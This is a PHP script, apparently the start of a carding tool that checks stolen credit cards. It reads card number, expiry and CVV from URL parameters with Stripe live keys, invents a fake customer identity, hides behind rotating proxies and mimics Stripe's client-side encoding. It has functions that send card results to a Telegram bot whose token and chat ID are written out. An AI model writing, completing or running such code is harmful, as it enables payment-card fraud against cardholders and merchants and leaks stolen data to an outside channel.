<?php
error_reporting(0);
$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$email = $_GET['email'];
date_default_timezone_set('Asia/Manila');

function forwardCharged($text) {
    $encodedText = urlencode($text);
    file_get_contents("https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=-1001811947326&text=$encodedText");
}
function forwardInsuff($text) {
    $encodedText = urlencode($text);
    file_get_contents("https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=-1001811947326&text=$encodedText");
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$card = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $card)[0];
    $mm = multiexplode(array(":", "|", ""), $card)[1];
    $yy = multiexplode(array(":", "|", ""), $card)[2];
    $cvv = multiexplode(array(":", "|", ""), $card)[3];

if (strlen($mm) == 1) $mm = "0$mm";
if (strlen($yy) == 2) $yy = "20$yy";

function xor_encode($plaintext) {
    $key = array(5);
    $key_length = count($key);
    $plaintext_length = strlen($plaintext);
    $ciphertext = '';

    for ($i = 0; $i < $plaintext_length; $i++) {
        $ciphertext .= chr(ord($plaintext[$i]) ^ $key[$i % $key_length]);
    }

    return $ciphertext;
}

function encode_base64($text) {
    $encoded_bytes = base64_encode($text);
    $encoded_text = str_replace(array("/", "+"), array("%2F", "%2B"), $encoded_bytes);
    return $encoded_text;
}

function get_js_encoded_string($pm) {
    $pm_encoded = xor_encode($pm);
    $base64_encoded = encode_base64($pm_encoded);
    return $base64_encoded . "eCUl";
}

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
### Random Info's
$curl = curl_init();
$url = "https://randomuser.me/api/0.8/?results=1";
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
if ($response === false) {
    die("Error: " . curl_error($curl));
}
curl_close($curl);
$data = json_decode($response, true);
$fname = ucfirst($data['results'][0]['user']['name']['first']);
$lname = ucfirst($data['results'][0]['user']['name']['last']);
$street = ucfirst($data['results'][0]['user']['location']['street']);
$randomNumber = sprintf("%04d", mt_rand(0, 9999));
$remail = strtolower($fname . '.' . $lname . $randomNumber . '@gmail.com');
################

// rotating proxy by Alice if failed hosting server magiging ip
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip_nums = array(
'',
    );
$rotateips = $ip_nums[array_rand($ip_nums)];
$ip_accounts = array(
1 =>    ''
    );
$rotateaccounts = $ip_accounts[array_rand($ip_accounts)];
$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
$proxyauth = !empty($hydra) ? $hydra : ''.$rotateaccounts.'';


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt_array($ch, array(CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$ips = curl_exec($ch);
curl_close($ch);
if (empty($ips)) {
    echo "<font color=red><b>DEAD<br> $card<br> [ BAD PROXY ] » [Use GOOD Proxy]<br>";
    exit();
}
?>